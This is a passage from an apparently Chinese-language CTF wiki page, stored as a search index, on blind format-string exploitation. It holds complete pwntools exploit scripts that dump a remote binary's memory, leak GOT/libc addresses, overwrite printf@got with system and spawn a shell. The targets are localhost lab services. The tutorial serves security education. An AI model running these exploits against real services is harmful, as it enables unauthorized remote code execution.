\u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a \u6cc4\u9732 got.plt \u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002 \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) \u6cc4\u9732 libc \u57fa\u5740& system \u5730\u5740 \u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0 \u4efb\u610f\u5199\u4fee\u6539 printf@got.plt payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive() 64 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002 dump \u7a0b\u5e8f \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive() \u66f4\u591a\u5b9e\u4f8b axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2 \u53c2\u8003 ctf-wiki pwn \u76f2\u6253","title":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/Bilnd_Pwn/#bilnd-","text":"","title":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/Bilnd_Pwn/#_1","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b","title":"\u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6"},{"location":"fmtstr/Bilnd_Pwn/#_2","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528","title":"\u539f\u7406"},{"location":"fmtstr/Bilnd_Pwn/#_3","text":"\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"fmtstr/Bilnd_Pwn/#32","text":"","title":"32 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/Bilnd_Pwn/#_4","text":"\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/Bilnd_Pwn/#_5","text":"\u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/Bilnd_Pwn/#_6","text":"\u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/Bilnd_Pwn/#dump","text":"dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/Bilnd_Pwn/#_7","text":"\u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002","title":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb"},{"location":"fmtstr/Bilnd_Pwn/#text","text":"\u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B 